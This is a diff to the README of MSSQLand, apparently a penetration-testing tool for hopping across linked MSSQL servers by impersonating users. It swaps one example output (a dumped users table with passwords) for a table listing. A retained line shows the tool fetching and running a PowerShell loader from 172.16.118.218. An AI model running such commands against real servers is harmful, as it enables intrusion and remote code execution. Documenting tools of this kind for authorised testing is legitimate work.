@@ -11,7 +11,7 @@ The tool's precise and structured output is surrounded by timestamps and enriche
 
 For example, running this command:
 ```shell
-MSSQLand.exe /t:SQL01:webapp01 /u:mjo /p:yapot117 /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:rows balard..users
+MSSQLand.exe /t:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:tables balard
 ```
 
 Create the following output:
@@ -26,23 +26,29 @@ Create the following output:
 |-> Database: master
 |-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
 [i] You can impersonate anyone as a sysadmin
-[+] Successfully impersonated user: webapp01
-[i] Logged in as webapp01
-|-> Mapped to the user dbo
-[>] Executing action: Rows
-|-> Retrieving rows from [balard].[dbo].[users]
+[+] Successfully impersonated user: Moulinier
+[i] Logged in as Moulinier
+|-> Mapped to the user guest
+[>] Executing action: Tables
+|-> Retrieving tables from [balard]
 
-| id | name         | password            |
-| -- | ------------ | ------------------- |
-| 0  | Jacquard     | Jacqu@rd!1940%Tr1c  |
-| 1  | Calot        | C@l0t$Agent#42%Espi |
-| 2  | Moulinier    | Moul!ni3r#V1ve*FR@  |
+| SchemaName | TableName | TableType  | Rows | Permissions                                                                                           |
+| ---------- | --------- | ---------- | ---- | ----------------------------------------------------------------------------------------------------- |
+| dbo        | secrets   | USER_TABLE | 42   | SELECT, VIEW DEFINITION                                                                               |
+| dbo        | drinks    | USER_TABLE | 51   | ALTER, CONTROL, EXECUTE, INSERT, RECEIVE, REFERENCES, SELECT, TAKE OWNERSHIP, UPDATE, VIEW DEFINITION |
 
 ====================================
   End at 2025-01-15 21:53:53 UTC
   Total duration: 0.11 seconds
 ====================================
 ```
+
+And yes, all the output tables are Markdown-friendly and can be directly copied and pasted into your notes.
+
+| SchemaName | TableName | TableType  | Rows | Permissions                                                                                           |
+| ---------- | --------- | ---------- | ---- | ----------------------------------------------------------------------------------------------------- |
+| dbo        | secrets   | USER_TABLE | 42   | SELECT, VIEW DEFINITION                                                                               |
+| dbo        | drinks    | USER_TABLE | 51   | ALTER, CONTROL, EXECUTE, INSERT, RECEIVE, REFERENCES, SELECT, TAKE OWNERSHIP, UPDATE, VIEW DEFINITION |
 
 ## Show Time 👑
 The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth.
@@ -147,8 +153,6 @@ Great! Now you can directly reach out to your loader with:
 ```shell
 MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
-
-And yes, all the outputted tables are Markdown friendly. What a kind gesture!
 
 ## Options and Features ⚙️
 
